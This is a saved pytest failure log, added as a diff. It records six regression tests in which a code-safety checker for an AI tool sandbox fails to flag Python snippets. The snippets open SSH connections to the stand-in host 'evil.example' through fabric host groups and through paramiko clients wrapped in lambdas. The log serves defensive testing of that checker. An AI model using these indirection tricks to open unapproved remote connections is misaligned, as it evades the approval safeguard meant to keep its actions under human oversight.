@@ -1,0 +1,46 @@
+FFFFFF                                                                   [100%]
+=================================== FAILURES ===================================
+__________ test_all_group_hosts_require_approval[fabric.SerialGroup] ___________
+/evidence/round11_regressions.py:9: in test_all_group_hosts_require_approval
+    assert _check_code_safety(code,session_id='round11') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import fabric; fabric.SerialGroup('approved.example','review@evil.example:22',config=fabric.Config(lazy=True)).run('hostname')", session_id='round11')
+_________ test_all_group_hosts_require_approval[fabric.ThreadingGroup] _________
+/evidence/round11_regressions.py:9: in test_all_group_hosts_require_approval
+    assert _check_code_safety(code,session_id='round11') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import fabric; fabric.ThreadingGroup('approved.example','review@evil.example:22',config=fabric.Config(lazy=True)).run('hostname')", session_id='round11')
+_______ test_all_group_hosts_require_approval[fabric.group.SerialGroup] ________
+/evidence/round11_regressions.py:9: in test_all_group_hosts_require_approval
+    assert _check_code_safety(code,session_id='round11') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import fabric; fabric.group.SerialGroup('approved.example','review@evil.example:22',config=fabric.Config(lazy=True)).run('hostname')", session_id='round11')
+___ test_lambda_client_requires_approval[make=lambda: paramiko.SSHClient()] ____
+/evidence/round11_regressions.py:17: in test_lambda_client_requires_approval
+    assert _check_code_safety(code,session_id='round11') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; make=lambda: paramiko.SSHClient(); make().connect(hostname='evil.example')", session_id='round11')
+_ test_lambda_client_requires_approval[first=lambda: paramiko.SSHClient(); make=lambda: first()] _
+/evidence/round11_regressions.py:17: in test_lambda_client_requires_approval
+    assert _check_code_safety(code,session_id='round11') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; first=lambda: paramiko.SSHClient(); make=lambda: first(); make().connect(hostname='evil.example')", session_id='round11')
+_____________________ test_inline_lambda_requires_approval _____________________
+/evidence/round11_regressions.py:25: in test_inline_lambda_requires_approval
+    assert _check_code_safety(code, session_id='round11') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko; (lambda: paramiko.SSHClient())().connect(hostname='evil.example')", session_id='round11')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round11_regressions.py::test_all_group_hosts_require_approval[fabric.SerialGroup]
+FAILED ../evidence/round11_regressions.py::test_all_group_hosts_require_approval[fabric.ThreadingGroup]
+FAILED ../evidence/round11_regressions.py::test_all_group_hosts_require_approval[fabric.group.SerialGroup]
+FAILED ../evidence/round11_regressions.py::test_lambda_client_requires_approval[make=lambda: paramiko.SSHClient()]
+FAILED ../evidence/round11_regressions.py::test_lambda_client_requires_approval[first=lambda: paramiko.SSHClient(); make=lambda: first()]
+FAILED ../evidence/round11_regressions.py::test_inline_lambda_requires_approval
+6 failed, 1 warning in 0.13s
